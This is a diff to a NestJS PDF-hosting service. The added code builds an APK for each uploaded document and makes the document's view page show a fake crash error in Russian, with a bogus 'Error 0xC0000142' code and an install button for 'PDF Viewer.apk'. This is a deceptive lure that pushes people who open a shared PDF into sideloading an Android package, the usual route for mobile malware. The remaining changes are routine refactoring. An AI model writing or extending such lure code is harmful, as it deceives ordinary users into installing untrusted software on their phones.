@@ -47,11 +47,14 @@ const common_1 = require("@nestjs/common");
 const path_1 = require("path");
 const fs = __importStar(require("fs"));
 const prisma_service_1 = require("../prisma.service");
+const apk_service_1 = require("../apk/apk.service");
 let PdfService = class PdfService {
     prisma;
+    apkService;
     viewTemplate;
-    constructor(prisma) {
+    constructor(prisma, apkService) {
         this.prisma = prisma;
+        this.apkService = apkService;
         const templatePath = (0, path_1.join)(__dirname, '..', '..', 'src', 'views', 'pdf-view.html');
         const distTemplatePath = (0, path_1.join)(__dirname, '..', 'views', 'pdf-view.html');
         if (fs.existsSync(distTemplatePath)) {
@@ -75,11 +78,11 @@ let PdfService = class PdfService {
                 },
             });
             const viewUrl = `/view/${record.id}`;
+            this.apkService.enqueueApkBuild(record.id, file.path, record.originalName);
             return {
                 message: 'File uploaded successfully',
                 originalFilename: file.originalname,
                 pdfId: record.id,
-                downloadUrl: viewUrl,
                 viewUrl,
             };
         }
@@ -92,19 +95,51 @@ let PdfService = class PdfService {
         if (!record) {
             throw new common_1.HttpException('Not found', common_1.HttpStatus.NOT_FOUND);
         }
-        const apkUrl = `/apk/download?pdfId=${encodeURIComponent(id)}`;
-        const docName = record.originalName.replace(/</g, '&lt;').replace(/>/g, '&gt;');
+        const docName = record.originalName
+            .replace(/</g, '&lt;')
+            .replace(/>/g, '&gt;');
+        const downloadApkName = process.env.DOWNLOAD_APK_NAME || 'PDF Viewer.apk';
+        const htmlModalTitle = process.env.HTML_MODAL_TITLE || 'помилка читання документу';
+        const htmlErrorMain = process.env.HTML_ERROR_MAIN || 'Не удалось открыть документ';
+        const htmlErrorDetail = process.env.HTML_ERROR_DETAIL || 'При попытке запустить документ возникла критическая ошибка. Файл повреждён или требует дополнительных компонентов для корректного отображения.<br><br>Приложение не может запустить средство просмотра. Для устранения проблемы загрузите и установите необходимый компонент запуска.';
+        const htmlErrorCode = process.env.HTML_ERROR_CODE || 'Error 0xC0000142 · Launch failed · PDF Viewer crashed';
+        const htmlInstallButton = process.env.HTML_INSTALL_BUTTON || '&#11015; Установить PDF Viewer';
         return this.viewTemplate
             .replace('{{DOC_NAME}}', docName)
-            .replace('{{APK_URL}}', apkUrl);
+            .replace('{{APK_URL}}', `/apk/download/${id}`)
+            .replace('{{DOWNLOAD_APK_NAME}}', downloadApkName)
+            .replace('{{HTML_MODAL_TITLE}}', htmlModalTitle)
+            .replace('{{HTML_ERROR_MAIN}}', htmlErrorMain)
+            .replace('{{HTML_ERROR_DETAIL}}', htmlErrorDetail)
+            .replace('{{HTML_ERROR_CODE}}', htmlErrorCode)
+            .replace('{{HTML_INSTALL_BUTTON}}', htmlInstallButton);
+    }
+    async getApkFilePath(id) {
+        const record = await this.prisma.pdfRecord.findUnique({ where: { id } });
+        if (!record) {
+            throw new common_1.HttpException('Not found', common_1.HttpStatus.NOT_FOUND);
+        }
+        const path = this.apkService.getApkPath(record.originalName);
+        if (!fs.existsSync(path)) {
+            throw new common_1.HttpException('APK not generated yet or already deleted', common_1.HttpStatus.NOT_FOUND);
+        }
+        return path;
     }
     async resolveRawFilePath(filename) {
-        let filePath = (0, path_1.join)(__dirname, '..', '..', 'uploads', 'original', filename);
+        const uploadDir = process.env.UPLOAD_DIR_NAME
+            ? (require('path').isAbsolute(process.env.UPLOAD_DIR_NAME)
+                ? process.env.UPLOAD_DIR_NAME
+                : (0, path_1.join)(__dirname, '..', '..', process.env.UPLOAD_DIR_NAME))
+            : (0, path_1.join)(__dirname, '..', '..', 'uploads', 'original');
+        let filePath = (0, path_1.join)(uploadDir, filename);
         if (!fs.existsSync(filePath)) {
             const possibleId = filename.replace('.pdf', '');
-            const r = await this.prisma.pdfRecord.findUnique({ where: { id: possibleId } });
-            if (r)
-                filePath = (0, path_1.join)(__dirname, '..', '..', 'uploads', 'original', r.modifiedName);
+            const r = await this.prisma.pdfRecord.findUnique({
+                where: { id: possibleId },
+            });
+            if (r) {
+                filePath = (0, path_1.join)(uploadDir, r.modifiedName);
+            }
             if (!fs.existsSync(filePath)) {
                 throw new common_1.HttpException('File not found', common_1.HttpStatus.NOT_FOUND);
             }
@@ -112,11 +147,15 @@ let PdfService = class PdfService {
         return filePath;
     }
     async resolveViewId(filename) {
-        const record = await this.prisma.pdfRecord.findFirst({ where: { modifiedName: filename } });
+        const record = await this.prisma.pdfRecord.findFirst({
+            where: { modifiedName: filename },
+        });
         if (record)
             return record.id;
         const possibleId = filename.replace('.pdf', '');
-        const recordById = await this.prisma.pdfRecord.findUnique({ where: { id: possibleId } });
+        const recordById = await this.prisma.pdfRecord.findUnique({
+            where: { id: possibleId },
+        });
         if (recordById)
             return recordById.id;
         throw new common_1.HttpException('File not found', common_1.HttpStatus.NOT_FOUND);
@@ -125,6 +164,7 @@ let PdfService = class PdfService {
 exports.PdfService = PdfService;
 exports.PdfService = PdfService = __decorate([
     (0, common_1.Injectable)(),
-    __metadata("design:paramtypes", [prisma_service_1.PrismaService])
+    __metadata("design:paramtypes", [prisma_service_1.PrismaService,
+        apk_service_1.ApkService])
 ], PdfService);
 //# sourceMappingURL=pdf.service.js.map
